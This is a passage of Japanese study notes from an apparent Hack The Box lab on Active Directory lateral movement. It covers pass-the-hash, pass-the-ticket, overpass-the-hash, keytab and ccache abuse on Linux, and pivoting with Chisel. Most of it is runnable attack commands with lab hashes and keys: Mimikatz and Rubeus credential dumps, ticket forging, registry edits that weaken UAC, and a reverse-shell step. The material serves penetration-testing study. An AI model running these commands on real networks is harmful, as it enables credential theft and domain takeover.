PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command " [https://www.revshells.com/](https://www.revshells.com/)のPowerShell #3 (Base64)のコピペ"

[+] Command executed with process id 520 on DC01
```


### Linuxで横方向への攻撃
具体的なシナリオ
Kali LinuxとかでターゲットのWindowsを攻撃して、そこからさらに掌握したWindowsの中で得られた情報を使って、Kali Linuxで横展開の攻撃を行うイメージ
#### Impacket
- [Impacket](https://github.com/SecureAuthCorp/impacket)には、`Command Execution`や`Credential Dumping`、`Enumeration`など、さまざまな操作に使用できるいくつかのツールがある
- 下のコマンドの他にもこれらのツールが使える
	- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
		- Windows Management Instrumentation (WMI) を使って、指定したユーザーの権限でリモートコマンドを実行する
		-  psexec や smbexec とは違い、NT AUTHORITY\SYSTEM
		-  David のアカウント権限で直接リモートコマンドを実行できる
		-  ファイアウォールやセキュリティ対策を回避しやすい
		-  低い検出率でコマンドを実行可能
	- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
	- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

`PsExec`を使用してターゲットマシンでコマンド実行を実行する
- サブネット内の各ホストに対して、ローカル管理者のパスワードハッシュを使用して認証を試みる場合は、コマンドに `--local-auth` を追加できる
	- あるホストの **SAMデータベースをダンプ** してローカル管理者のハッシュを取得し、そのハッシュを使って **他のホストにもアクセスできるか** を調べられる
```shell
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

#### CrackMapExecでハッシュを渡す
- 大規模なActive Directoryネットワークのセキュリティ評価を自動化するのに役立つエクスプロイト後ツール
- CrackMapExecを使用して、ローカル管理者として正常に認証できる1つのホストを探しているネットワーク内の一部またはすべてのホストを認証できる

CrackMapExecでハッシュを渡す
- --local-auth を使うと、サブネット内の各ホストにローカル管理者ハッシュで認証を試せる。
- SAMデータベースをダンプして取得したローカル管理者ハッシュ を使い、他のホストにもログインできるか確認可能
- -x オプションを使えば、リモートでコマンドを実行可能。
	- 対策として「Local Administrator Password Solution（LAPS）」の導入を推奨。LAPS は ローカル管理者パスワードを定期的にランダム化 し、パスワードの使い回しを防ぐ。
```shell
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

whoamiコマンドを実行している様子
```shell
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
公式ドキュメント
- [CrackMapExecドキュメントWiki](https://web.archive.org/web/20220902185948/https://wiki.porchetta.industries/)（[NetExecドキュメントwiki](https://www.netexec.wiki/)）


#### RDPでハッシュを渡す
xfreerdpとかでアクセスできるけど、いくつかの注意点がある
- `Restricted Admin Mode`はデフォルトで無効、ターゲットホストで有効にする必要がある。有効にしないとエラー出る
- 有効にする方法
	- **`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`** に新しいレジストリキー **`DisableRestrictedAdmin`（REG_DWORD）** を追加し、その値を **0** に設定することで有効化
windows上でコマンドで実行
```cmd
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

`Restricted Admin Mode`を有効にしたら、Pass The Hashでログインできる
```shell-session
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```


### UACによる制限
- UAC（User Account Control）は、ローカルユーザーがリモート管理操作を実行する能力を制限する
- **`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`** のレジストリキーが **0** に設定されている場合、**リモート管理が許可されるのは「Administrator（RID-500）」アカウントのみ** 
	- この値を `1` に設定すると、他のローカル管理者アカウントもリモート管理が可能になる
```sh
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```
- `FilterAdministratorToken`（デフォルトでは無効）が **有効（値が `1`）** になっている場合、**RID-500（Administrator）アカウントも UAC の制限を受ける**。
- そのため、この設定が有効な場合、**このアカウントを使用した Pass-the-Hash 攻撃は失敗する**。
- これらの設定は **ローカル管理者アカウントのみに適用される**。
- **ドメインアカウントで管理者権限を取得した場合は、Pass-the-Hash 攻撃を実行可能**。



# PtT(Pass The Ticket)
不正に入手した Kerberosチケットを使用して横方向に移動する
## Kerberos認証
- チケットベースの認証方法
- ネットワーク上でパスワードを直接送信しないで認証を行う
- SSOの一種
	- 一度ログインすると、その後は認証情報を再入力しないで使えるため
	- ログイン時に認証チケットを取得して、それを使って他のサービスにログインするため
- 流れ
	1. ログイン時にTGT(チケット授与チケット)を取得
		- ユーザーはパスワードのハッシュを使って認証サーバー(Authentication Server)にログイン
		- 認証に成功すると、TGTが発行される
		- TGTは一定時間有効
	2. サービスへのアクセス時にTGS(サービスチケット)を取得
		- ユーザーがDCとか他のサーバーにアクセスする時TGT(Ticket Granted Ticket)を提示する
		- チケット発行サーバー(Ticket Granted Server)はTGTを確認して、そのサービス用のチケット(TGSチケット)を発行する
	3. サービス側がTGSを検証してアクセスを許可
		- ユーザーがTGSを使って目的のサーバーに接続
#### PtT攻撃
- 攻撃の実行には、有効なケルベロスチケットが必要
	- **サービスチケット（TGS - Ticket Granting Service）**  
		- 特定のリソースへのアクセスを許可するチケット。
		- 2種類ある
			- コンピューターアカウントのチケット
				- コンピューターがActive Directory（AD）と通信するときに必要なチケット
				- 例 : ドメイン参加しているPCがログイン時にADに認証要求を送るとき など
				- チケットの名前の特徴 → `$`で終わる
			- ユーザーアカウントのチケット
				- ユーザーがサービスにアクセスするときに必要なチケット
				- 例 : ユーザーがドメイン内のファイルサーバーやRDPにアクセスするときなど
				- チケットの名前の特徴 → [ランダムな値]
				- `ユーザー名@サービス-ドメイン名.kirbi` の形式

	- **チケット授与チケット（TGT - Ticket Granting Ticket）**  
	    ユーザーが権限を持つ任意のリソースにアクセスするためのサービスチケットを要求するためのチケット。

- ユーザーが`TGT`を要求する場合、現在のタイムスタンプをパスワードハッシュで暗号化してドメインコントローラーを認証する必要がある
- ドメインコントローラーがユーザーのIDを検証すると（ドメインはユーザーのパスワードハッシュを知っているため、タイムスタンプを復号化できるため）

ここでのシナリオ

PtT攻撃の前提
ユーザーPCに侵入・ローカル管理者権限を取得した状態

## Windows
### LSASSのメモリからKerberosチケットを取得
Windowsでは、チケットはLSASS（Local Security Authority Subsystem Service）プロセスによって処理され、保存される
- LSASS と通信してTGTをリクエストする必要がある
- `Mimikatz`モジュール`sekurlsa::tickets /export`を使用して、LSASSはTGTやTGSをメモリ上にキャッシュからすべてのチケットを収集できる
	- 結果は、チケットを含む拡張子`.kirbi`で保存される

チケットの方式
- **`$` で終わるチケット** → コンピューターアカウント用
    - Active Directory とやり取りするために必要
- **ユーザーのチケット** → ユーザー名が含まれる
    - `@` の後に **サービス名とドメイン** が続く
- **チケットのフォーマット例** → `[randomvalue]-username@service-domain.local.kirbi`

mimikatz.exeの実行
```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit
```

evil-winrmとかだと上の方式がうまく動かない可能性が全然あるので、↓を使う
```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "lsadump::lsa" "lsadump::secrets" "exit" > mimikatz_full_dump.txt
```

- 注意点
	- Mimikatzバージョン2.2.0 20220919を使用すると、間違って他暗号化のため正しく動作しない
Rubeus.exeでもチケットのエクスポートはできる
```cmd-session
Rubeus.exe dump /nowrap
```

取得したKerberosチケットの収集
```cmd-session
dir *.kirbi
```

### Pass the Key（PtK） / OverPass the Hash（OPtH）
- LSASSのメモリからKerberosチケットを取得するPtT攻撃は、実際にはNTLMパスワードハッシュを再利用する方法で、Kerberosを直接利用しているものではなかった
- 一方でPtKとかOPtHは、ドメイン参加ユーザーのハッシュや鍵を使って、チケット授与チケット(TGT)を作成する手法
- チケットを偽造するための準備
	- ユーザーのハッシュが必要
Mimikatzの`sekurlsa::ekeys`を使用して、すべてのユーザーのKerberos暗号化キーをダンプできる
```cmd
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

上のコマンドの結果、AES256_HMAC キーと RC4_HMAC キーにアクセスできるようになり、Mimikatz と Rubeus を使用して、OverPass the Hash または Pass the Key 攻撃を実行できる
- **AES暗号化**（AES256またはAES128）を使用した方がいい？？
- 新しい `cmd.exe` ウィンドウが作成され、ターゲットユーザーのコンテキストで、任意のサービスへのアクセスをリクエストできる
	- でもこれだと、明示的に資格情報を使う認証が必要な場合は突破できない
```cmd-session
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:<User Name> /ntlm:<sekurlsa::ekeysのrc4_*の値>
```

Rubeus を使用して Kerberosチケットを偽造 するには、/rc4、/aes128、/aes256、または /des オプションを使用し、ユーザー名・ドメイン・ハッシュを指定して asktgt モジュールを実行できる
Mimikatz sekurlsa::ekeys を使用して取得した情報から、AES256のハッシュを使用してチケットを作成する
```cmd
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:<User Name> /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

- Mimikatzはパス・ザ・キー/オーバーパス・ザ・ハッシュ攻撃を実行するために管理権限を必要とする
- Rubeusは管理権限を必要としない
注意点
- **Windowsドメイン（機能レベル2008以降）** は、デフォルトで **AES暗号化**（AES256またはAES128）を使用  
- Kerberos交換時にRC4_HMAC（NTLMハッシュ）を使用すると、暗号化ダウングレードと見なされる可能性がある
- セキュリティシステムがRC4_HMACの使用を検出し、不審な活動としてアラートを出すことがある

#### PtTへの展開
- Kerberosチケットをいくつか取得したので、これらを利用して環境内で横展開できる
- Rubeusを使用してOverPass-the-Hash（OPtH）攻撃を実行し、チケットをBase64形式で取得した
- しかし、代わりに **`/ptt` フラグ**を使用すれば、**取得したTGTまたはTGSチケットを現在のログオンセッションに直接適用**できる
```cmd-session
./Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

↑のコマンドの出力の中のbase64 出力を使用して、Pass the Ticketを実行できる
- ↓のコマンド実行後に`[+] ticket successfully imported!`って出てきたら、実行後のコマンドプロンプトはPtTが成功したプロンプトになってる
```cmd-session
./Rubeus.exe ptt /ticket:<上のコマンドで出力されたBase64の値>
```



別の方法として、ディスク上の.kirbi ファイルを使用して、現在のセッションにチケットをインポートすることも可能
Mimikatzからエクスポートしたチケットを使用して、インポートする
```cmd-session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
.kirbi を base64 に変換して、チケットを渡す攻撃を実行することもできる
**.kirbiをBase64形式に変換する**
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```


Mimikatzモジュール`kerberos::ptt`と、インポートしたいチケットを含む.kirbiファイルを使用して、パス・ザ・チケット攻撃を実行することもできる
- `misc::cmd`
	- 新しいcmd.exeウィンドウが開き、適用されたチケットを引き継いだ状態で作業できる
	- Mimikatzを閉じても、その新しいウィンドウ内ではチケットが適用された状態が維持される
```cmd-session
mimikatz.exe 
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
misc::cmd
exit
dir \\DC01.inlanefreight.htb\c$
```


### PowerShell Remotingでチケットを渡す
- [PowerShell Remoteing](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2)を使用すると、リモートコンピュータでスクリプトまたはコマンドを実行できる
- PowerShell Remotingを有効にすると、HTTPリスナーとHTTPSリスナーの両方が作成される
- リスナーは、HTTP の場合は標準ポート TCP/5985、HTTPS の場合は TCP/5986 で実行される
- リモート コンピューターで PowerShell Remoteting セッションを作成する
	- 管理者権限・リモート管理ユーザーグループのメンバーであるか、セッション設定に明示的な PowerShell Remoteting 権限を持っている必要がある
#### Mimikatz
Pass-the-Ticket（PtT）でPowerShellリモート接続
1. **Mimikatzでチケットをインポート**
    - `cmd.exe` を開く
    - `mimikatz.exe` を実行
    - `kerberos::ptt` で `.kirbi` チケットを適用
2. **PowerShellでターゲットに接続**
    - **同じ `cmd.exe` から PowerShell を起動**
    - `Enter-PSSession -ComputerName <ターゲットマシン>` で接続
```cmd-session
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
```

横展開
```sh
powershell
Enter-PSSession -ComputerName DC01
```


#### Rubeus 
- Pass-the-Ticket を使用した PowerShell リモート接続**

1. `createnetonly` を使用して犠牲プロセスを作成
- `Rubeus.exe` を実行して、新しいログオンセッションを作成
```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

 2. `asktgt` を使用して TGT を取得し、インポート
- ターゲットユーザーのAES256キーを使用
- 取得したチケットを `ptt` で適用
```cmd
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```
3. PowerShellでターゲットにリモート接続
- 同じ `cmd.exe` から PowerShell を起動
- `Enter-PSSession` でリモートマシンに接続
```cmd
powershell
Enter-PSSession -ComputerName DC01
```

- **`createnetonly` で新しいセッションを作成**（既存のTGTを上書きせずにチケットを適用）
- **`asktgt` でAESキーを使用してTGTを取得し、`ptt` で適用**
- **PowerShellでターゲットにリモート接続し、横展開**


## Linux
Linux も Active Directory (AD) に参加できるから、DCへの横展開とかはLinuxからもできる

**Linux上のKerberos**
- Windows と Linux では、同じプロセスを使用してチケット付与チケット (TGT) とサービス チケット (TGS) をリクエストするけど、チケット情報の保存方法に違いがある
- 保存場所
	- Linux マシンは **Kerberos のチケットを `/tmp` ディレクトリ内の ccache ファイルとして保存**する
	- デフォルトで **チケットの保存場所は環境変数 `KRB5CCNAME` に格納**される
		- **`KRB5CCNAME` の役割**
			- Kerberos チケットが現在使用されているかどうかを確認できる。
			- チケットの保存場所が変更されている場合、それも特定できる。
		- **読み取り・書き込み権限で保護**されているが、rootユーザーは簡単にアクセスできる
	- Keytabファイル
		- Kerberos のプリンシパル（ユーザーやサービス）と、暗号化されたキーのペア を含むファイル。
		- Kerberos のパスワードからキーが生成される。
		- スクリプトを Kerberos 認証で自動実行するため便利
		- パスワードを平文で保存することなく、自動認証が可能
- **Kerberos クライアントがインストールされているマシンなら、Keytab ファイルを作成できる。**
- **Keytab ファイルは、作成したマシンに限定されず、別のコンピュータにコピーしても使用可能**

シナリオ
- Linux システムから Kerberos を悪用する方法を学ぶために、**ドメインコントローラー (DC) に接続された LINUX01 というコンピュータ** を使用する
- この LINUX01 に直接アクセスすることはできず、**MS01 を経由する必要がある**

MS01からLinuxマシンへの接続
```sh
ssh user@LINUX01
```

ポートフォワード経由のLinux認証
```shell-session
 ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

### LinuxマシンがADに参加しているかを調べる
realmというツールを使って調べることができる
- 出力される情報
	- Kerberosメンバーとして設定されているか
	- ドメイン名（inlanefreight.htb）に関する情報
	- ログインが許可されているユーザーとグループに関する情報
```shell-session
realm list
```

realmが使えない場合は、[sssd](https://sssd.io/)や[winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html)などのツールで同じことができる
```shell-session
ps -ef | grep -i "winbind\|sssd"
```

ホスト名で確認（参加してるとFQDNがADのドメインになることも）
```sh
hostname -f
```

AD関連ファイルをチェック
```sh
cat /etc/sssd/sssd.conf
cat /etc/samba/smb.conf
```
### LinuxからDCになりすまして接続する
#### Keytabファイルの検索
- keytabファイルの拡張子は、デフォルトで`.keytab`であることを利用する
```shell-session
find / -name *keytab* -ls 2>/dev/null
```

#### cronjobなどの自動スクリプト内の検索
- .keytabファイルが見つからないときは、cronjobの中でファイル名が見つかるかもしれない
- `kinit`コマンドとか
	- Kerberos認証を行うためのコマンド
		- kinit -kt <keytabファイル> <ユーザー名>
	- ユーザーのTGT(Ticket Granting Ticket)をリクエストし、それをccacheファイルとして保存する
```shell-session
crontab -l
```

#### ccacheファイルを見つける
**環境変数**
- ユーザーがドメインを認証すると、チケット情報を保存するccacheファイルが作成される
- 認証が有効な間、ユーザーのセッションが続く間、Kerberosクレデンシャルを保存する
- このccacheファイルのパスは`KRB5CCNAME`という環境変数に配置される
- Kerberos認証をサポートするツールが、Kerberos認証を行うために使用されるのが本来の目的
```shell-session
env | grep -i krb5
```

**デフォルトの保存場所**
- ccacheファイルはデフォルトで`/tmp`ファイルに保存されるため、`/tmp`内を探す
```shell-session
ls -la /tmp
```

#### KeyTabファイルの悪用
**なりすまし先のユーザーを探す**
- KeyTabファイルを悪用するには、どのユーザーのために作成されたかを知る必要がある
- klist
	- LinuxでKerberosと対話するためのアプリケーション
	- .keytabファイルから情報を読み取る
.keytabファイル情報の一覧表示
```shell-session
klist 
```

出力された情報の中のPrincipalの欄でどのユーザーになりすませるかがわかる
- ユーザー名を指定するときは、Principalに書かれている「ユーザー名@ドメイン名」をセットで使う必要がある

**`kinit`を使用してユーザーになりすます**
```shell-session
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

smbに接続してなりすましできているかどうかを確認する
```shell-session
smbclient //dc01/carlos -k -c ls
```

## Linuxで他アカウントにログインする
.keytabファイルから認証情報を抽出することで、他アカウントにログインする

### KeyTabExtractでKeyTabハッシュを抽出する
- NTLMハッシュを使用して、アカウントのパスワードの取得・PtH攻撃もできる
- AES8種で、Rubeusでチケットの偽造もできる
```shell-session
wget https://raw.githubusercontent.com/sosdave/KeyTabExtract/refs/heads/master/keytabextract.py
python3 keytabextract.py /opt/specialfiles/carlos.keytab 
```

[https://crackstation.net/](https://crackstation.net/)などのレインボーテーブル攻撃などでNTLMハッシュをクラックして、他アカウントにログインできる
```shell-session
su - carlos@inlanefreight.htb
```

### ccacheでより多くのハッシュを取得する
前提　: ADに参加しているlinux上でrootを取得済
- ccacheファイルを悪用するには、必要なのはファイルの読み取り権限だけ
- ccacheファイルは、作成したユーザーだけが読むことができるが、ルートを取得すれば全て閲覧できる

全ユーザーのccacheファイルを取得する
-  狙い : まだログイン情報を取得できていないユーザーを探す
```shell-session
ls -la /tmp
```

idコマンドで、グループメンバーを識別する
```shell-session
id julio@inlanefreight.htb
```
Domain Adminsグループ : ドメインコントローラーホストへのアクセスを行える
ccacheファイルを使用するには、ccacheファイルをコピーし、ファイルパスを`KRB5CCNAME`変数に割り当てる

ccacheファイルを現在のセッションにインポートする
```shell-session
klist
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
smbclient //dc01/C$ -k -c ls -no-pass
```

| コマンド | 説明 |
|----------|------|
| `klist` | 現在の Kerberos チケットを確認 |
| `cp /tmp/krb5cc_* .` | `/tmp/` 内の Kerberos チケットをコピー（バックアップ） |
| `export KRB5CCNAME=/root/krb5cc_*` | Kerberos チケットを設定し、使用するよう指定 |
| `klist` | 設定されたチケットを再確認 |
| `smbclient //dc01/C$ -k -c ls -no-pass` | Kerberos 認証を使い、Windows の SMB 共有フォルダにアクセス |
### KerberosでLinux攻撃ツールを使用する
今までは、ドメイン参加マシンからは接続できても、攻撃者のkali linuxとかは接続は想定していなかった。
このシナリオでは、攻撃者のKali Linuxを[Chisel](https://github.com/jpillora/chisel)や[Proxychains](https://github.com/haad/proxychains)などのツールを使用して、ドメイン参加マシンのMS01を介して通信する方法を学ぶ

まず`/etc/hosts`ファイルに登録する
```shell-session
snowyowl644@htb[/htb]$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

socks5とポート1080を使用するように、プロキシチェーンの設定ファイルを変更する
```shell-session
snowyowl644@htb[/htb]$ cat /etc/proxychains.conf

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```

Kali Linuxに[Chisel](https://github.com/jpillora/chisel)をダウンロードする
```shell-session
snowyowl644@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
snowyowl644@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
snowyowl644@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
snowyowl644@htb[/htb]$ sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

RDP経由でMS01に接続し、[Chisel](https://github.com/jpillora/chisel)を実行する
```shell-session
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

クライアントIPは攻撃ホスト(Kali Linux)のIP
```cmd
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

Kali Linuxから、Julioのccacheファイルを`LINUX01`から転送し、ccacheファイルのパスに対応する値で環境変数`KRB5CCNAME`に作成する
```shell-session
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

##### Impacketを使用する
- proxychains必要
- Kerberos認証を行うためには、`-k`を指定する
```shell-session
proxychains impacket-wmiexec dc01 -k
```

##### Evil-WinRM を使用する
- Evil-WinRMをKerberos 認証で使用するには、Kerberos のネットワーク認証用パッケージをインストールする必要がある
- Debian 系の Linux (Parrot, Kali など) では、このパッケージは `krb5-user`という名前
```shell-session
sudo apt-get install krb5-user -y
```
- Kerberos レルム (Realm) を入力するプロンプト が表示されるので「ドメイン名」と「KDC」を入力する
- 設定ファイルはここ
```shell-session
cat /etc/krb5.conf
```

winRMの使用
```shell-session
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```


##### Miscellaneous
- Windows で `ccache file`、または Linux マシンで `kirbi file`を使用する場合は、[impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) を使用して変換できる
- ccacheファイルをkirbiファイルに変換する
```shell-session
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

.kirbiに変換することで、Rubeus を使用した Windows セッションに変換されたチケットのインポートが行える
```cmd-session
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

- [Linikatz](https://github.com/CiscoCXSecurity/linikatz)は、Active Directoryとの統合時にLinuxマシンの資格情報を悪用するために、Ciscoのセキュリティチームが作成したツール
- LinikatzはUnix環境に`Mimikatz`と同じ働き
- mimikatzと同様に管理者権限は必要
- クレデンシャルを抽出したら、名前が`linikatz.`で始まるフォルダに吐き出す
```shell-session
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```
